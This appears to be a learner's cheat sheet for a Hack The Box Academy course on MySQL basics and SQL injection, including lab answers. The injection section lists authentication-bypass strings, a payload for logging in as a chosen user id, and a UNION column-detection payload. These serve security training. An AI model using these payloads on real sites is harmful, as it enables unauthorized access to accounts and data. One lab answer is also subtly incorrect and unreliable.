## MySQL  


| **Command**   | **Description**   |
| --------------|-------------------|
| **General** |
| `mysql -u root -h docker.hackthebox.eu -P 3306 -p` | login to mysql database [Intro to MySQL](https://academy.hackthebox.com/module/33/section/183) |
| `SHOW DATABASES` | List available databases |
| `USE users` | Switch to database |
| **Tables** |
| `CREATE TABLE logins (id INT, ...)` | Add a new table |
| `SHOW TABLES` | List available tables in current database |
| `DESCRIBE logins` | Show table properties and columns |
| `INSERT INTO table_name VALUES (value_1,..)` | Add values to table [](https://academy.hackthebox.com/module/33/section/190) |
| `INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)` | Add values to specific columns in a table |
| `UPDATE table_name SET column1=newvalue1, ... WHERE <condition>` | Update table values. Note: we have to specify the 'WHERE' clause with UPDATE, in order to specify which records get updated. The 'WHERE' clause will be discussed next. |
| **Columns** |
| `SELECT * FROM table_name` | Show all columns in a table |
| `SELECT column1, column2 FROM table_name` | Show specific columns in a table |
| `DROP TABLE logins` | Delete a table |
| `ALTER TABLE logins ADD newColumn INT` | Add new column |
| `ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn` | Rename column |
| `ALTER TABLE logins MODIFY oldColumn DATE` | Change column datatype |
| `ALTER TABLE logins DROP oldColumn` | Delete column |
| **Output** |
| `SELECT * FROM logins ORDER BY column_1` | Sort by column |
| `SELECT * FROM logins ORDER BY column_1 DESC` | Sort by column in descending order |
| `SELECT * FROM logins ORDER BY column_1 DESC, id ASC` | Sort by two-columns |
| `SELECT * FROM logins LIMIT 2` | Only show first two results |
| `SELECT * FROM logins LIMIT 1, 2` | Only show first two results starting from index 2 [Query Results](https://academy.hackthebox.com/module/33/section/191) |
| `SELECT * FROM table_name WHERE <condition>` | List results that meet a condition |
| `SELECT * FROM logins WHERE username LIKE 'admin%'` | List results where the name is similar to a given string |
| `select * from departments where dept_name like 'Develop%';` | Will get the department number for the `Development` department. |
| `select * from employees where first_name like 'Bar%' and hire_date = '1990-01-01' LIMIT 2;` | Retrieve the last name of the employee whose first name starts with "Bar" AND who was hired on `1990-01-01`. |

## MySQL Operator Precedence  

>[SQL Operators](https://academy.hackthebox.com/module/33/section/192)  

* Division (`/`), Multiplication (`*`), and Modulus (`%`)
* Addition (`+`) and Subtraction (`-`)
* Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
* NOT (`!`)
* AND (`&&`)
* OR (`||`)

>Query: In the 'titles' table, what is the number of records WHERE the employee number is **greater** than `10000` **OR** their title does **NOT** contain `engineer`?  

```
select * from titles WHERE emp_no > 10000 OR title != 'engineer%';
```  

## SQL Injection

### Identify SQLi  

| **Payload**   | **URL Encoded**   |
| --------------|-------------------|
| `'` | %27 |
| `"` | %22 |
| `#` | %23 |
| `;` | %3B |
| `)` | %29 |


| **Payload**   | **Description**   |
| --------------|-------------------|
| **Auth Bypass** |
| `admin' or '1'='1` | Basic Auth Bypass [Subverting Query Logic - Authentication Bypass](https://academy.hackthebox.com/module/33/section/194) |
| `tom' or '1'='1` | Log in as the user 'tom'. |
| `admin')-- -` | Basic Auth Bypass With comments [Using Comments](https://academy.hackthebox.com/module/33/section/799) |
| `any' OR id =5);# | Login as the user with the id 5 to get the flag. |

>Connect to the MySQL server with the 'mysql' tool, and find the number of records returned when doing a 'Union' of all records in the 'employees' table and all records in the 'departments' table.  

```
SELECT COUNT(*) AS total_records 
FROM
  (SELECT 'employees' AS source_table, emp_no, birth_date, first_name, last_name, gender, hire_date, NULL AS dept_no, NULL AS dept_name FROM employees
   UNION
   SELECT 'departments' AS source_table, NULL AS emp_no, NULL AS birth_date, NULL AS first_name, NULL AS last_name, NULL AS gender, NULL AS hire_date, dept_no, dept_name FROM departments) AS combined_table;
```

>In this query, we added `NULL` place holders for the columns that are not present in one of the tables. This should now execute without any errors, and it will give you the total number of records returned after performing the UNION of the two tables.

| `cn' UNION select 1,2,3-- -` | Detect number of columns using Union injection. Reminder: We are adding an extra dash (-) at the end, to show you that there is a space after (--). [Union Clause - Columns](https://academy.hackthebox.com/module/33/section/806) |
